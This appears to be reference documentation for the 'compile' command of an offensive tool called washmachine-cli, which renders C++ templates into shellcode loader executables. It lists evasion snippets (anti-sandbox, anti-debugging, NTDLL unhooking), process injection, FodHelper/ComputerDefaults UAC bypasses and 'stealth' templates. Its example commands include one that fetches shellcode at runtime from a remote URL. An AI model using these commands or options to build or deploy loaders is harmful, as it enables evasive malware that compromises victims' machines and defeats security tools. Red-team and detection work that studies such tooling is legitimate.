# `compile`

Build a shellcode loader executable by rendering a C++ template with selected snippets and compiling it with an auto-discovered toolchain.

```text
washmachine-cli compile --shellcode <file> [options]
```

## Shellcode source (one required)

| Option | Alias | Description |
|---|---|---|
| `--shellcode` | `-s` | Path to a `.bin` shellcode file |
| `--shellcode-hex` | | Inline hex-encoded shellcode string |
| `--shellcode-url` | `-u` | URL to fetch shellcode from at runtime |

::: tip Working from a `.exe`
The CLI `compile` command expects a flat `.bin`. To compile from an `.exe` source first convert it:

- **Native shellcode-format PE** (donut output, sRDI, `pe2shellcode`) — flatten with [`strip`](/cli/strip) and feed the resulting `.bin` to `compile`.
- **Managed (.NET) assembly** — convert to position-independent shellcode with [donut](https://github.com/TheWover/donut) (provisioned via [`provision`](/cli/provision)), then compile the resulting `.bin`.

The desktop client performs this routing automatically when an `.exe` is selected as the shellcode source — see [Architecture → Desktop](/internals/overview#desktop-application).
:::

## Options

| Option | Alias | Type | Default | Description |
|---|---|---|---|---|
| `--template` | `-t` | string | `shellcode-minimal` | Template identifier from the YAML catalog |
| `--encoder` | `-e` | int | `0` (none) | Bin2Shell encoder index |
| `--envelope` | `-v` | int | `0` (none) | Bin2Shell envelope index |
| `--snippet` | | `section=id` | | Snippet override per section (repeatable) |
| `--verbose` | | flag | | Enable verbose diagnostic logging |
| `--json` | | flag | | Emit machine-readable JSON output |

## Snippet selection

Each template has placeholders for snippet sections. Use `--snippet <section>=<id>` to override the default selection for any section:

```powershell
washmachine-cli compile -s payload.bin --snippet antiemulation=SirAllocALot
washmachine-cli compile -s payload.bin --snippet antisandbox=Default --snippet antidebugging=IsDebuggerPresent
```

Run `washmachine-cli list snippets` to see all available sections and item IDs.

### Available sections

| Section | Key | Multi-select | Description |
|---|---|---|---|
| Anti Emulation | `antiemulation` | Yes | Delay and resource-exhaustion techniques to defeat emulators |
| Anti Analysis | `antianalysis` | Yes | Tool detection, thread hiding, NTDLL unhooking |
| Anti Debugging | `antidebugging` | Yes | PEB checks, timing, hardware breakpoints, parent process validation |
| Anti Sandbox/VM | `antisandbox` | Yes | CPUID, MAC address, registry, process list, resource checks |
| Guardrails | `guardrail` | Yes | Environment variable, domain, date range, file existence checks |
| Decoy | `decoy` | Yes | Distraction actions (open notepad, show message box, create files) |
| Process Injection | `psinjection` | No | Remote thread, APC queue, process reflection |
| Shellcode Execution | `shellcodeexecution` | No | VirtualAlloc, heap, fiber, callback, threadpool, syscall methods |
| UAC Bypass | `uacb` | No | FodHelper, ComputerDefaults registry hijack |
| Generic Payload | `genericshellcode` | No | Built-in test payloads (calc, MessageBox) |

## Templates

| ID | Name | Description |
|---|---|---|
| `default` | Default Loader | Full-featured loader with all protection placeholders |
| `paranoid` | Paranoid Loader | Continuous watchdog thread checking for debuggers and analysis tools |
| `aggressive` | Aggressive Loader | Active anti-analysis countermeasures with continuous monitoring |
| `stealth` | Stealth Loader | Six-layer defense: emulation → sandbox → environment → debugger → payload → execution |
| `minimal` | Shellcode Minimal | Bare-bones loader with only shellcode setup and execution |
| `minimal-dll` | Minimal DLL | DLL with `DllMain` entry point for process injection scenarios |

## Processing stages

1. Parse and validate shellcode source arguments.
2. Provision Bin2Shell if encoding/envelope options are set and Bin2Shell is missing.
3. Load the YAML catalog and resolve the selected template.
4. Build a `CppCompilationPlan` — map snippet selections to template placeholders.
5. Apply Bin2Shell encoding/envelope transforms if requested.
6. Render the C++ source by substituting `{{PLACEHOLDER}}` tokens with selected snippets.
7. Discover an available compiler (MSVC → GCC → Clang).
8. Invoke the compiler with optimized flags and link required libraries.
9. Name the output binary `YYYYMMDD_HHMMSS-<sha256prefix>.exe`.
10. Write session artifacts (source, build log) to `logging/session_<id>/`.

## JSON output schema

```json
{
  "success": true,
  "outputExePath": "temp/cpp/Compiled Binaries/20260330_120000-a1b2c.exe",
  "generatedSourcePath": "logging/session_.../source.cpp",
  "notes": ["Compiler: cl.exe (MSVC 2022)"],
  "compilerPath": "C:/Program Files/Microsoft Visual Studio/.../cl.exe",
  "conversionSuccess": true,
  "conversionError": null
}
```

## Examples

```powershell
# Compile with default minimal template
washmachine-cli compile -s payload.bin

# Full-featured loader with encoding
washmachine-cli compile -s payload.bin -t default -e 1 -v 2

# Custom snippet selections
washmachine-cli compile -s payload.bin -t stealth --snippet antiemulation=SirAllocALot --snippet antisandbox=Default

# Hex input with verbose output
washmachine-cli compile --shellcode-hex FC4883E4F0... --verbose

# URL-based runtime fetch
washmachine-cli compile -u http://host/shell.bin -t stealth

# JSON output for automation
washmachine-cli compile -s payload.bin --json
```
